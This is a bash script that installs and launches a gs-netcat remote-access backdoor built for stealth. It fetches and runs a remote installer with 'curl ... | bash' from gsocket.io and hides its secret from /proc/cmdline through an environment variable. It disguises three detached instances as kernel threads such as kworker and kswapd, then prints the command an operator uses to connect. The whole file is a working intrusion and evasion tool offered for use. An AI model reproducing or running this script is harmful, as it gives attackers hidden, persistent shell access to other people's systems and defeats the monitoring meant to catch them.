#!/bin/bash
# PRIMAL GSSocket - SUPERIOR STEALTH
# Key difference: Uses GS_ARGS env var, NOT command line args
# This hides -s SECRET from /proc/cmdline

SECRET="${1:-}"
MODE="${2:-stealth}"

# Kernel thread names - blend in perfectly
KNAMES=("[kworker/0:0]" "[kworker/u8:0]" "[migration/0]" "[ksoftirqd/0]" "[watchdog/0]" "[kswapd0]" "[khugepaged]" "[kdevtmpfs]" "[kauditd]" "[khungtaskd]")

# Find gs-netcat binary
find_bin() {
    for loc in \
        "$(command -v gs-netcat 2>/dev/null)" \
        "$HOME/.config/htop/defunct" \
        "/var/www/monitor-server/defunct" \
        "/usr/bin/gs-netcat" \
        "/tmp/.gsusr-$(id -u)/defunct" \
        "/dev/shm/defunct"
    do
        [ -x "$loc" ] 2>/dev/null && echo "$loc" && return 0
    done
    return 1
}

# Find existing secret
find_secret() {
    for f in \
        "$HOME/.config/htop/defunct.dat" \
        "/var/www/monitor-server/defunct.dat" \
        "/tmp/.gsusr-$(id -u)/defunct.dat"
    do
        [ -f "$f" ] && cat "$f" 2>/dev/null && return 0
    done
    return 1
}

GS_BIN=$(find_bin)

# Install if not found
if [ -z "$GS_BIN" ]; then
    if command -v curl >/dev/null 2>&1; then
        [ -n "$SECRET" ] && export X="$SECRET"
        bash -c "$(curl -fsSL gsocket.io/y)" >/dev/null 2>&1
    elif command -v wget >/dev/null 2>&1; then
        [ -n "$SECRET" ] && export X="$SECRET"
        bash -c "$(wget -qO- gsocket.io/y)" >/dev/null 2>&1
    else
        echo '{"status":"error","message":"need curl or wget"}'
        exit 1
    fi
    sleep 2
    GS_BIN=$(find_bin)
fi

[ -z "$GS_BIN" ] && { echo '{"status":"error","message":"binary not found"}'; exit 1; }

# Get secret
[ -z "$SECRET" ] && SECRET=$(find_secret)
[ -z "$SECRET" ] && SECRET=$("$GS_BIN" -g 2>/dev/null)
[ -z "$SECRET" ] && SECRET=$(head -c 16 /dev/urandom 2>/dev/null | xxd -p | head -c 22)

# CRITICAL: Start with MAXIMUM stealth
# Use GS_ARGS environment variable - this HIDES arguments from /proc/cmdline!
start_stealth() {
    local name="${KNAMES[$((RANDOM % ${#KNAMES[@]}))]}"
    
    (
        cd /tmp 2>/dev/null || cd /
        # KEY: Use GS_ARGS env var instead of command line!
        # This makes cmdline show ONLY the process name, not the secret
        export GS_ARGS="-s $SECRET -liqD"
        export TERM=xterm-256color
        export SHELL=/bin/sh
        
        # exec -a changes argv[0] (process name in ps)
        # The actual arguments are read from GS_ARGS env var
        exec -a "$name" "$GS_BIN" </dev/null >/dev/null 2>&1
    ) &
    disown 2>/dev/null
}

# Start instances
for i in 1 2 3; do
    start_stealth
    sleep 0.3
done

sleep 2

# Count
running=$(pgrep -f "defunct\|gs-netcat" 2>/dev/null | wc -l)
pids=$(pgrep -f "defunct\|gs-netcat" 2>/dev/null | tr '\n' ',' | sed 's/,$//')

# Output
cat << EOJSON
{"status":"success","secret":"$SECRET","binary":"$GS_BIN","instances":$running,"pids":"$pids","connect":"gs-netcat -s $SECRET -i","features":["env-stealth","no-cmdline-args","kernel-thread-disguise"]}
EOJSON
